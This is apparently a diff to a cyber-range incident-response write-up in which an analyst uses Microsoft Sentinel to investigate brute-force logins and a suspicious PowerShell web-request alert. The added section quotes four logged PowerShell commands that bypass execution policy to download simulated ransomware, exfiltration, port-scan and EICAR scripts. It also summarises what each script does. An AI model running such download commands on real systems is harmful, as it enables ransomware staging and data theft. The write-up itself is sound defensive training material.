@@ -60,11 +60,60 @@ Microsoft Sentinel will execute the query to log any accounts that failed login 
 
 After the rule was created, we see two entities: the host machine `win-vm-mde` and the IP address `193.37.69.105`. In our initial findings, there were 4 total IP addresses including this one that reportedly originated from Russia. They all occurred within the 5-day window and yet did not appear as separate entities. 
 
-<img width="1250" alt="Screenshot 2025-06-11 200640" src="https://github.com/user-attachments/assets/335151e5-97d0-4f8b-98e7-aa33f5a92ce4" />
+![image](https://github.com/user-attachments/assets/ec4ad430-8aa5-4ed6-b2bf-04a958ead84d)
 
-![image](https://github.com/user-attachments/assets/f5376744-0aa6-46c7-9cd5-114bbe0aa36d)
+<img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />
 
-Another query was run to check for any new brute force attempts that occurred in the last hour. Coincidentally, the IP address `193.37.69.105` was attempting to log in to the host `win-vm-mde` at the same time the brute force detection rule was being created. It is very likely that due to the concurrent and very recent activity from the threat actor, Microsoft Sentinel only processed the most recent attacks as the most relevant alerts to be included in this detection rule. The other IP addresses may not be correlated or displayed until the incident has had enough time to fully update. As a result, rather than an issue with the query itself, the cause may have been due to latency and data refresh timing. The Incidents diagram below shows only the host machine `win-vm-mde` and the IP address `193.37.69.105`.
+<img width="1507" alt="Screenshot 2025-06-12 203844" src="https://github.com/user-attachments/assets/8bcf4bfb-9856-401d-aebd-9c92dc8dee5a" />
+
+
+![image](https://github.com/user-attachments/assets/a7b19096-eba4-4c75-b4a7-605c23cd2527)
+
+
+![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)
+
+
+Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, it was discovered that the following PowerShell commands were run on machine `win-vm-mde`
+
+The `Alert PowerShell Suspicious Web Request Rule` incident was triggered by 1 user, but downloaded 4 different scripts with 4 different commands.
+
+win-vm-mde
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
+powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
+
+The folowing scripts contained
+portscan.ps1
+eicar.ps1
+exfiltratedata.ps1
+pwncrypt.ps1
+
+![image](https://github.com/user-attachments/assets/1a5b9297-7f69-46af-84ac-733aee1430f4)
+
+
+The user `ylavnu` was contacted and asked what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software, which resulted in a black screen for a few seconds, and then 'nothing happened' afterwards. 
+
+
+At this point we know the scripts were downloaded but didn't know if they were executed. So we decided to run another query.
+
+
+
+![image](https://github.com/user-attachments/assets/4adb0e5b-62cd-473a-95e0-616095f5e3f3)
+
+It was determined that the downloaded scripts actually did run. The scripts were then passed off to the malware reverse engineering team. Here were the short descriptions for each script:
+
+portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.
+
+eicar.ps1: Creates an EICAR test file, which tests antivirus solutions and logs the process.
+
+exfiltratedata.ps1: Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.
+
+pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.
+
+
+
+
 
 ![image](https://github.com/user-attachments/assets/8cb74516-252b-4a8c-aaae-303b37367968)
 
